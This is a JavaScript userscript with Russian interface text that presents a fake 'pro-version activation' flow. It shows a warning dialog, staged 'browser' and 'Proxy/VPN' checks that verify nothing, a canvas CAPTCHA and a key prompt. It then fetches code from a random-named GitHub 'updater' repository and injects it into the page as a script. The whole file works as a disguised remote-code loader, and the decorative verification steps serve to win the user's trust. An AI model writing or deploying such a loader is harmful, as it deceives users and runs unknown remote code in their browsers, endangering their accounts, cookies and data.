(() => {
    "use strict";

    // Функция для генерации случайной строки капчи
    const generateCaptcha = () => {
        const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789';
        let captcha = '';
        for (let i = 0; i < 6; i++) {
            captcha += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return captcha;
    };

    // Функция для отрисовки капчи на canvas
    const drawCaptcha = (ctx, text) => {
        ctx.fillStyle = '#1a1a1a';
        ctx.fillRect(0, 0, 200, 70);

        // Рисуем помехи
        for (let i = 0; i < 100; i++) {
            ctx.fillStyle = `rgba(255,255,255,${Math.random() * 0.2})`;
            ctx.fillRect(
                Math.random() * 200,
                Math.random() * 70,
                Math.random() * 2,
                Math.random() * 2
            );
        }

        // Рисуем волнистые линии
        for (let i = 0; i < 4; i++) {
            ctx.beginPath();
            ctx.strokeStyle = `rgba(255,255,255,${Math.random() * 0.2})`;
            ctx.lineWidth = 1;
            let x = 0;
            let y = Math.random() * 70;
            ctx.moveTo(x, y);
            while (x < 200) {
                x += 10;
                y += Math.random() * 10 - 5;
                ctx.lineTo(x, y);
            }
            ctx.stroke();
        }

        // Рисуем текст
        ctx.font = 'bold 32px Arial';
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';
        
        // Рисуем каждый символ отдельно с разным наклоном и цветом
        for (let i = 0; i < text.length; i++) {
            const x = 35 + i * 27;
            const y = 35 + (Math.random() * 10 - 5);
            const rotation = (Math.random() * 30 - 15) * Math.PI / 180;
            
            ctx.save();
            ctx.translate(x, y);
            ctx.rotate(rotation);
            
            // Градиент для каждой буквы
            const gradient = ctx.createLinearGradient(0, -15, 0, 15);
            gradient.addColorStop(0, '#22C55E');
            gradient.addColorStop(1, '#16A34A');
            ctx.fillStyle = gradient;
            
            ctx.fillText(text[i], 0, 0);
            ctx.restore();
        }
    };

    // Показать стилизованное диалоговое окно с предупреждением
    const showWarning = () => {
        return new Promise((resolve) => {
            const warningDiv = document.createElement('div');
            warningDiv.style.cssText = `
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%) perspective(1000px) rotateX(15deg);
                width: 420px;
                background: linear-gradient(145deg, rgba(40,40,55,0.98), rgba(25,25,35,0.98));
                backdrop-filter: blur(20px);
                color: #fff;
                padding: 35px;
                border-radius: 24px;
                box-shadow: 0 25px 60px rgba(0, 0, 0, 0.3),
                           0 0 100px rgba(82, 0, 255, 0.05),
                           inset 0 0 0 1px rgba(255,255,255,0.1);
                z-index: 999999;
                font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
                opacity: 0;
                transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
            `;

            // Иконка предупреждения
            const warningIcon = document.createElement('div');
            warningIcon.innerHTML = `
                <svg width="48" height="48" viewBox="0 0 48 48" fill="none">
                    <circle cx="24" cy="24" r="20" fill="rgba(255,255,255,0.05)" stroke="rgba(255,255,255,0.2)" stroke-width="2"/>
                    <path d="M24 14v14" stroke="rgba(255,255,255,0.8)" stroke-width="3" stroke-linecap="round"/>
                    <circle cx="24" cy="34" r="2" fill="rgba(255,255,255,0.8)"/>
                </svg>
            `;
            warningIcon.style.cssText = `
                margin: 0 auto 25px;
                text-align: center;
                opacity: 0;
                transform: translateY(20px);
                transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
                transition-delay: 0.1s;
            `;

            const warningText = document.createElement('p');
            warningText.style.cssText = `
                margin: 0 0 30px 0;
                line-height: 1.7;
                font-size: 16px;
                color: rgba(255,255,255,0.85);
                text-align: center;
                letter-spacing: 0.3px;
                opacity: 0;
                transform: translateY(20px);
                transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
                transition-delay: 0.2s;
            `;
            warningText.textContent = "Для активации про-версии необходимо пройти проверку. Продолжая, вы принимаете ответственность за его использование.";

            const buttonContainer = document.createElement('div');
            buttonContainer.style.cssText = `
                display: flex;
                justify-content: center;
                gap: 15px;
                margin-top: 20px;
                opacity: 0;
                transform: translateY(20px);
                transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
                transition-delay: 0.3s;
            `;

            const createButton = (text, color, hoverColor, isOutline = false) => {
                const button = document.createElement('button');
                button.textContent = text;
                button.style.cssText = `
                    padding: 12px 28px;
                    background: ${isOutline ? 'transparent' : color};
                    color: ${isOutline ? color : '#fff'};
                    border: ${isOutline ? `2px solid ${color}` : 'none'};
                    border-radius: 12px;
                    font-size: 15px;
                    font-weight: 500;
                    cursor: pointer;
                    transition: all 0.3s ease;
                    min-width: 140px;
                    backdrop-filter: blur(10px);
                    font-family: inherit;
                `;

                button.onmouseover = () => {
                    button.style.transform = 'translateY(-2px)';
                    button.style.background = hoverColor;
                    button.style.boxShadow = `0 10px 20px rgba(${color.match(/\d+/g)?.[0]}, ${color.match(/\d+/g)?.[1]}, ${color.match(/\d+/g)?.[2]}, 0.3)`;
                    if (color.includes('239, 68, 68') || color.includes('220, 38, 38')) {
                        button.style.color = 'white';
                    }
                };

                button.onmouseout = () => {
                    button.style.transform = 'translateY(0)';
                    button.style.background = isOutline ? 'transparent' : color;
                    button.style.boxShadow = 'none';
                    if (color.includes('239, 68, 68') || color.includes('220, 38, 38')) {
                        button.style.color = isOutline ? color : '';
                    }
                };

                return button;
            };

            const cancelButton = createButton("Отмена", "rgb(239, 68, 68)", "rgb(220, 38, 38)", true);
            const okButton = createButton("Принять", "rgb(34, 197, 94)", "rgb(22, 163, 74)");

            const animateOut = () => {
                warningDiv.style.opacity = '0';
                warningDiv.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(-15deg)';
                setTimeout(() => {
                    warningDiv.remove();
                }, 600);
            };

            cancelButton.onclick = () => {
                animateOut();
                resolve(false);
            };

            okButton.onclick = () => {
                animateOut();
                resolve(true);
            };

            buttonContainer.appendChild(cancelButton);
            buttonContainer.appendChild(okButton);
            warningDiv.appendChild(warningIcon);
            warningDiv.appendChild(warningText);
            warningDiv.appendChild(buttonContainer);
            document.body.appendChild(warningDiv);

            requestAnimationFrame(() => {
                warningDiv.style.opacity = '1';
                warningDiv.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(0)';
                warningIcon.style.opacity = '1';
                warningIcon.style.transform = 'translateY(0)';
                warningText.style.opacity = '1';
                warningText.style.transform = 'translateY(0)';
                buttonContainer.style.opacity = '1';
                buttonContainer.style.transform = 'translateY(0)';
            });
        });
    };

    // Функция для создания окна с капчей
    const showCaptchaPrompt = () => {
        return new Promise((resolve) => {
            let captchaText = generateCaptcha();
            let timeLeft = 60; // 60 секунд на ввод капчи
            let verificationStep = 1; // Текущий шаг проверки
            let checkSteps = ['Проверка браузера...', 'Проверка на Proxy/VPN...', 'Проверка завершена'];
            let currentStep = 0;
            let checkboxClicked = false; // Флаг для отслеживания нажатия на чекбокс
            
            const promptDiv = document.createElement('div');
            promptDiv.style.cssText = `
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%) perspective(1000px) rotateX(15deg);
                width: 380px;
                background: linear-gradient(145deg, rgba(40,40,55,0.98), rgba(25,25,35,0.98));
                backdrop-filter: blur(20px);
                color: #fff;
                padding: 35px;
                border-radius: 24px;
                box-shadow: 0 25px 60px rgba(0, 0, 0, 0.3),
                           0 0 100px rgba(82, 0, 255, 0.05),
                           inset 0 0 0 1px rgba(255,255,255,0.1);
                z-index: 999999;
                font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
                opacity: 0;
                transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
            `;

            const title = document.createElement('h2');
            title.textContent = 'Подтвердите, что вы человек';
            title.style.cssText = `
                margin: 0 0 25px 0;
                font-size: 24px;
                font-weight: 600;
                text-align: center;
                background: linear-gradient(135deg, #22C55E, #16A34A);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                opacity: 0;
                transform: translateY(20px);
                transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
                transition-delay: 0.2s;
            `;

            const timer = document.createElement('div');
            timer.style.cssText = `
                text-align: center;
                font-size: 18px;
                color: #fff;
                margin-bottom: 20px;
            `;
            timer.textContent = `Время до конца: ${timeLeft} сек`;

            // Создаем чекбокс для первого шага
            const checkboxContainer = document.createElement('div');
            checkboxContainer.style.cssText = `
                display: flex;
                flex-direction: column;
                align-items: center;
                margin: 20px 0;
                opacity: 0;
                transform: translateY(20px);
                transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
                transition-delay: 0.3s;
            `;

            const checkbox = document.createElement('button');
            checkbox.style.cssText = `
                width: 100px;
                height: 100px;
                border: 2px solid rgba(255, 255, 255, 0.1);
                border-radius: 12px;
                background: rgba(255, 255, 255, 0.05);
                cursor: pointer;
                transition: all 0.3s ease;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 24px;
                color: rgba(255, 255, 255, 0.5);
                position: relative;
                overflow: hidden;
            `;
            checkbox.innerHTML = '✓';

            const checkStatus = document.createElement('div');
            checkStatus.style.cssText = `
                margin-top: 15px;
                text-align: center;
                color: rgba(255, 255, 255, 0.8);
                font-size: 14px;
                min-height: 20px;
            `;

            // Canvas для капчи (второй шаг)
            const canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 70;
            canvas.style.cssText = `
                display: none;
                margin: 0 auto 20px;
                border-radius: 8px;
                opacity: 0;
                transform: translateY(20px);
                transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
                transition-delay: 0.3s;
            `;
            
            const ctx = canvas.getContext('2d');
            drawCaptcha(ctx, captchaText);

            const inputContainer = document.createElement('div');
            inputContainer.style.cssText = `
                position: relative;
                margin: 0 0 30px;
                opacity: 0;
                transform: translateY(20px);
                transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
                transition-delay: 0.3s;
                display: flex;
                align-items: center;
                gap: 10px;
                display: none;
            `;

            const input = document.createElement('input');
            input.type = 'text';
            input.placeholder = 'Введите текст с картинки';
            input.style.cssText = `
                width: 100%;
                padding: 16px;
                border: 2px solid rgba(255, 255, 255, 0.1);
                border-radius: 12px;
                background: rgba(255, 255, 255, 0.05);
                color: white;
                font-size: 15px;
                font-family: inherit;
                outline: none;
                transition: all 0.3s ease;
                box-sizing: border-box;
                backdrop-filter: blur(10px);
            `;

            checkbox.onclick = () => {
                if (checkboxClicked) return; // Если уже нажат, выходим
                checkboxClicked = true; // Устанавливаем флаг
                
                // Анимация нажатия
                checkbox.style.transform = 'scale(0.95)';
                checkbox.style.background = '#22C55E';
                checkbox.style.borderColor = '#22C55E';
                checkbox.style.color = 'white';
                checkbox.style.cursor = 'default'; // Меняем курсор на обычный
                
                // Добавляем анимацию загрузки
                const loader = document.createElement('div');
                loader.style.cssText = `
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    border-radius: 12px;
                    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
                    animation: loading 1.5s infinite;
                `;
                
                checkbox.appendChild(loader);
                
                // Добавляем стили для анимации загрузки
                const style = document.createElement('style');
                style.textContent = `
                    @keyframes loading {
                        0% { transform: translateX(-100%); }
                        100% { transform: translateX(100%); }
                    }
                `;
                document.head.appendChild(style);
                
                // Последовательно показываем статусы проверки
                const showNextStep = () => {
                    if (currentStep < checkSteps.length) {
                        checkStatus.textContent = checkSteps[currentStep];
                        currentStep++;
                        if (currentStep < checkSteps.length - 1) {
                            setTimeout(showNextStep, 15000); // 15 секунд на каждый шаг
                        } else if (currentStep === checkSteps.length - 1) {
                            setTimeout(() => {
                                checkStatus.textContent = checkSteps[currentStep];
                                // После всех проверок
                                setTimeout(() => {
                                    // Переход ко второму шагу
                                    checkboxContainer.style.display = 'none';
                                    canvas.style.display = 'block';
                                    inputContainer.style.display = 'flex';
                                    verificationStep = 2;
                                    
                                    requestAnimationFrame(() => {
                                        canvas.style.opacity = '1';
                                        canvas.style.transform = 'translateY(0)';
                                        inputContainer.style.opacity = '1';
                                        inputContainer.style.transform = 'translateY(0)';
                                    });
                                }, 1000);
                            }, 15000); // 15 секунд для последнего шага
                        }
                    }
                };
                
                showNextStep(); // Начинаем показывать статусы
            };

            const refreshButton = document.createElement('button');
            refreshButton.innerHTML = `
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M2 12C2 17.5228 6.47715 22 12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
                    <path d="M12 2C9.79086 2 7.29086 3.00736 5.5 4.5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
                    <path d="M2 6V2H6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
            `;
            refreshButton.style.cssText = `
                background: linear-gradient(145deg, #22C55E, #16A34A);
                border: none;
                border-radius: 12px;
                color: white;
                width: 52px;
                height: 52px;
                display: flex;
                align-items: center;
                justify-content: center;
                cursor: pointer;
                transition: all 0.3s ease;
                backdrop-filter: blur(10px);
                flex-shrink: 0;
                box-shadow: 0 4px 12px rgba(34, 197, 94, 0.2);
            `;

            const buttonContainer = document.createElement('div');
            buttonContainer.style.cssText = `
                display: flex;
                justify-content: center;
                gap: 15px;
                margin-top: 20px;
                opacity: 0;
                transform: translateY(20px);
                transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
                transition-delay: 0.4s;
            `;

            const createButton = (text, color, hoverColor, isOutline = false) => {
                const button = document.createElement('button');
                button.textContent = text;
                button.style.cssText = `
                    padding: 14px 32px;
                    background: ${isOutline ? 'transparent' : color};
                    color: ${isOutline ? color : '#fff'};
                    border: ${isOutline ? `2px solid ${color}` : 'none'};
                    border-radius: 12px;
                    font-size: 15px;
                    font-weight: 500;
                    cursor: pointer;
                    transition: all 0.3s ease;
                    min-width: 140px;
                    backdrop-filter: blur(10px);
                    font-family: inherit;
                `;

                button.onmouseover = () => {
                    button.style.transform = 'translateY(-2px)';
                    button.style.background = hoverColor;
                    button.style.boxShadow = `0 10px 20px rgba(${color.match(/\d+/g)?.[0]}, ${color.match(/\d+/g)?.[1]}, ${color.match(/\d+/g)?.[2]}, 0.3)`;
                    if (color.includes('239, 68, 68') || color.includes('220, 38, 38')) {
                        button.style.color = 'white';
                    }
                };

                button.onmouseout = () => {
                    button.style.transform = 'translateY(0)';
                    button.style.background = isOutline ? 'transparent' : color;
                    button.style.boxShadow = 'none';
                    if (color.includes('239, 68, 68') || color.includes('220, 38, 38')) {
                        button.style.color = isOutline ? color : '';
                    }
                };

                return button;
            };

            const cancelButton = createButton("Отмена", "rgb(239, 68, 68)", "rgb(220, 38, 38)", true);
            const submitButton = createButton("Подтвердить", "rgb(34, 197, 94)", "rgb(22, 163, 74)");

            const animateOut = (success = false) => {
                promptDiv.style.opacity = '0';
                promptDiv.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(-15deg)';
                setTimeout(() => {
                    promptDiv.remove();
                    if (success) resolve(true);
                    else resolve(false);
                }, 600);
            };

            cancelButton.onclick = () => {
                animateOut();
            };

            const validateCaptcha = () => {
                if (verificationStep === 1) return false;
                
                const value = input.value.trim();
                if (value === '') {
                    input.style.border = '2px solid rgb(239, 68, 68)';
                    input.style.boxShadow = '0 0 0 4px rgba(239, 68, 68, 0.1)';
                    input.classList.add('shake');
                    setTimeout(() => {
                        input.style.border = '2px solid rgba(255, 255, 255, 0.1)';
                        input.style.boxShadow = 'none';
                        input.classList.remove('shake');
                    }, 1000);
                    return false;
                }
                return value.toLowerCase() === captchaText.toLowerCase();
            };

            submitButton.onclick = () => {
                if (verificationStep === 1) {
                    checkbox.click();
                } else if (validateCaptcha()) {
                    animateOut(true);
                    showActivationPrompt();
                } else {
                    input.style.border = '2px solid rgb(239, 68, 68)';
                    input.style.boxShadow = '0 0 0 4px rgba(239, 68, 68, 0.1)';
                    input.classList.add('shake');
                    setTimeout(() => {
                        input.style.border = '2px solid rgba(255, 255, 255, 0.1)';
                        input.style.boxShadow = 'none';
                        input.classList.remove('shake');
                        captchaText = generateCaptcha();
                        drawCaptcha(ctx, captchaText);
                        input.value = '';
                        timeLeft = 60;
                    }, 1000);
                }
            };

            const style = document.createElement('style');
            style.textContent = `
                @keyframes shake {
                    0%, 100% { transform: translateX(0); }
                    25% { transform: translateX(-10px); }
                    75% { transform: translateX(10px); }
                }
                .shake {
                    animation: shake 0.5s ease-in-out;
                }
            `;
            document.head.appendChild(style);

            input.onkeypress = (e) => {
                if (e.key === 'Enter' && verificationStep === 2) {
                    if (validateCaptcha()) {
                        animateOut(true);
                        showActivationPrompt();
                    } else {
                        input.style.border = '2px solid rgb(239, 68, 68)';
                        input.style.boxShadow = '0 0 0 4px rgba(239, 68, 68, 0.1)';
                        input.classList.add('shake');
                        setTimeout(() => {
                            input.style.border = '2px solid rgba(255, 255, 255, 0.1)';
                            input.style.boxShadow = 'none';
                            input.classList.remove('shake');
                            captchaText = generateCaptcha();
                            drawCaptcha(ctx, captchaText);
                            input.value = '';
                            timeLeft = 60;
                        }, 1000);
                    }
                }
            };

            refreshButton.onclick = () => {
                captchaText = generateCaptcha();
                drawCaptcha(ctx, captchaText);
                timeLeft = 60;
            };

            // Таймер обратного отсчета
            const countdown = setInterval(() => {
                timeLeft--;
                timer.textContent = `Время до конца: ${timeLeft} сек`;
                
                if (timeLeft <= 0) {
                    clearInterval(countdown);
                    animateOut(false);
                }
            }, 1000);

            buttonContainer.appendChild(cancelButton);
            buttonContainer.appendChild(submitButton);
            inputContainer.appendChild(input);
            inputContainer.appendChild(refreshButton);
            promptDiv.appendChild(title);
            promptDiv.appendChild(timer);
            promptDiv.appendChild(checkboxContainer);
            checkboxContainer.appendChild(checkbox);
            checkboxContainer.appendChild(checkStatus);
            promptDiv.appendChild(canvas);
            promptDiv.appendChild(inputContainer);
            promptDiv.appendChild(buttonContainer);
            document.body.appendChild(promptDiv);

            requestAnimationFrame(() => {
                promptDiv.style.opacity = '1';
                promptDiv.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(0)';
                title.style.opacity = '1';
                title.style.transform = 'translateY(0)';
                checkboxContainer.style.opacity = '1';
                checkboxContainer.style.transform = 'translateY(0)';
                buttonContainer.style.opacity = '1';
                buttonContainer.style.transform = 'translateY(0)';
            });
        });
    };

    // Функция для создания окна активации ключа
    const showActivationPrompt = () => {
        return new Promise((resolve) => {
            let attempts = 3; // Счетчик попыток
            let d = 1; // Счетчик для окон

            const promptDiv = document.createElement('div');
            promptDiv.style.cssText = `
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%) perspective(1000px) rotateX(15deg);
                width: 380px;
                background: linear-gradient(145deg, rgba(40,40,55,0.98), rgba(25,25,35,0.98));
                backdrop-filter: blur(20px);
                color: #fff;
                padding: 35px;
                border-radius: 24px;
                box-shadow: 0 25px 60px rgba(0, 0, 0, 0.3),
                           0 0 100px rgba(82, 0, 255, 0.05),
                           inset 0 0 0 1px rgba(255,255,255,0.1);
                z-index: 999999;
                font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
                opacity: 0;
                transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
            `;

            const title = document.createElement('h2');
            title.textContent = 'Введите активационный ключ';
            title.style.cssText = `
                margin: 0 0 25px 0;
                font-size: 24px;
                font-weight: 600;
                text-align: center;
                background: linear-gradient(135deg, #22C55E, #16A34A);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                opacity: 0;
                transform: translateY(20px);
                transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
                transition-delay: 0.2s;
            `;

            const attemptsText = document.createElement('div');
            attemptsText.style.cssText = `
                text-align: center;
                margin-bottom: 15px;
                font-size: 14px;
                padding: 8px 16px;
                background: rgba(255, 255, 255, 0.05);
                border-radius: 12px;
                border: 1px solid rgba(255, 255, 255, 0.1);
                display: inline-block;
                position: relative;
                left: 50%;
                transform: translateX(-50%);
                backdrop-filter: blur(10px);
                color: #22C55E;
                font-weight: 500;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                transition: all 0.3s ease;
            `;
            attemptsText.textContent = `Осталось попыток: ${attempts}`;

            const inputContainer = document.createElement('div');
            inputContainer.style.cssText = `
                position: relative;
                margin: 0 0 30px;
                opacity: 0;
                transform: translateY(20px);
                transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
                transition-delay: 0.3s;
                display: flex;
                align-items: center;
                gap: 10px;
            `;

            const input = document.createElement('input');
            input.type = 'text';
            input.placeholder = 'Введите ключ';
            input.style.cssText = `
                width: 100%;
                padding: 16px;
                border: 2px solid rgba(255, 255, 255, 0.1);
                border-radius: 12px;
                background: rgba(255, 255, 255, 0.05);
                color: white;
                font-size: 15px;
                font-family: inherit;
                outline: none;
                transition: all 0.3s ease;
                box-sizing: border-box;
                backdrop-filter: blur(10px);
            `;

            const buttonContainer = document.createElement('div');
            buttonContainer.style.cssText = `
                display: flex;
                justify-content: center;
                gap: 15px;
                margin-top: 20px;
                opacity: 0;
                transform: translateY(20px);
                transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
                transition-delay: 0.4s;
            `;

            const createButton = (text, color, hoverColor, isOutline = false) => {
                const button = document.createElement('button');
                button.textContent = text;
                button.style.cssText = `
                    padding: 14px 32px;
                    background: ${isOutline ? 'transparent' : color};
                    color: ${isOutline ? color : '#fff'};
                    border: ${isOutline ? `2px solid ${color}` : 'none'};
                    border-radius: 12px;
                    font-size: 15px;
                    font-weight: 500;
                    cursor: pointer;
                    transition: all 0.3s ease;
                    min-width: 140px;
                    backdrop-filter: blur(10px);
                    font-family: inherit;
                `;

                button.onmouseover = () => {
                    button.style.transform = 'translateY(-2px)';
                    button.style.background = hoverColor;
                    button.style.boxShadow = `0 10px 20px rgba(${color.match(/\d+/g)?.[0]}, ${color.match(/\d+/g)?.[1]}, ${color.match(/\d+/g)?.[2]}, 0.3)`;
                    if (color.includes('239, 68, 68') || color.includes('220, 38, 38')) {
                        button.style.color = 'white';
                    }
                };

                button.onmouseout = () => {
                    button.style.transform = 'translateY(0)';
                    button.style.background = isOutline ? 'transparent' : color;
                    button.style.boxShadow = 'none';
                    if (color.includes('239, 68, 68') || color.includes('220, 38, 38')) {
                        button.style.color = isOutline ? color : '';
                    }
                };

                return button;
            };

            const cancelButton = createButton("Отмена", "rgb(239, 68, 68)", "rgb(220, 38, 38)", true);
            const submitButton = createButton("Активировать", "rgb(34, 197, 94)", "rgb(22, 163, 74)");

            const animateOut = (success = false) => {
                promptDiv.style.opacity = '0';
                promptDiv.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(-15deg)';
                setTimeout(() => {
                    promptDiv.remove();
                    if (success) resolve(true);
                    else resolve(false);
                }, 600);
            };

            cancelButton.onclick = () => {
                animateOut();
            };

            const validateKey = () => {
                const value = input.value.trim();
                if (value === '') {
                    input.style.border = '2px solid rgb(239, 68, 68)';
                    input.style.boxShadow = '0 0 0 4px rgba(239, 68, 68, 0.1)';
                    input.classList.add('shake');
                    setTimeout(() => {
                        input.style.border = '2px solid rgba(255, 255, 255, 0.1)';
                        input.style.boxShadow = 'none';
                        input.classList.remove('shake');
                    }, 1000);
                    return false;
                }
                return value === 'VALID_KEY'; // Замените 'VALID_KEY' на ваш реальный ключ
            };

            const handleInvalidKey = () => {
                attempts--;
                attemptsText.textContent = `Осталось попыток: ${attempts}`;
                
                if (attempts <= 0) {
                    animateOut(false);
                    return;
                }

                input.style.border = '2px solid rgb(239, 68, 68)';
                input.style.boxShadow = '0 0 0 4px rgba(239, 68, 68, 0.1)';
                input.classList.add('shake');
                setTimeout(() => {
                    input.style.border = '2px solid rgba(255, 255, 255, 0.1)';
                    input.style.boxShadow = 'none';
                    input.classList.remove('shake');
                }, 1000);
            };

            submitButton.onclick = () => {
                if (validateKey()) {
                    animateOut(true);
                    loadCodeFromGitHub();
                } else {
                    handleInvalidKey();
                }
            };

            const style = document.createElement('style');
            style.textContent = `
                @keyframes shake {
                    0%, 100% { transform: translateX(0); }
                    25% { transform: translateX(-10px); }
                    75% { transform: translateX(10px); }
                }
                .shake {
                    animation: shake 0.5s ease-in-out;
                }
            `;
            document.head.appendChild(style);

            input.onkeypress = (e) => {
                if (e.key === 'Enter') {
                    if (validateKey()) {
                        animateOut(true);
                        loadCodeFromGitHub();
                    } else {
                        handleInvalidKey();
                    }
                }
            };

            buttonContainer.appendChild(cancelButton);
            buttonContainer.appendChild(submitButton);
            inputContainer.appendChild(input);
            promptDiv.appendChild(title);
            promptDiv.appendChild(attemptsText);
            promptDiv.appendChild(inputContainer);
            promptDiv.appendChild(buttonContainer);
            document.body.appendChild(promptDiv);

            requestAnimationFrame(() => {
                promptDiv.style.opacity = '1';
                promptDiv.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(0)';
                title.style.opacity = '1';
                title.style.transform = 'translateY(0)';
                inputContainer.style.opacity = '1';
                inputContainer.style.transform = 'translateY(0)';
                buttonContainer.style.opacity = '1';
                buttonContainer.style.transform = 'translateY(0)';
            });
        });
    };

    // Функция для загрузки кода из GitHub
    const loadCodeFromGitHub = async () => {
        try {
            const response = await fetch('https://raw.githubusercontent.com/uki85n2tziii4rhqtwnupfijgupnj45/updater/refs/heads/main/main');
            const code = await response.text();
            
            const script = document.createElement('script');
            script.textContent = code;
            document.body.appendChild(script);
            
            console.log('Код успешно загружен и выполнен');
        } catch (error) {
            console.error('Ошибка при загрузке кода:', error);
        }
    };

    // Основная функция запуска
    const init = async () => {
        const warningResult = await showWarning();
        if (warningResult) {
            const captchaResult = await showCaptchaPrompt();
            if (captchaResult) {
                console.log('Капча пройдена');
            }
        }
    }
    init();
})();
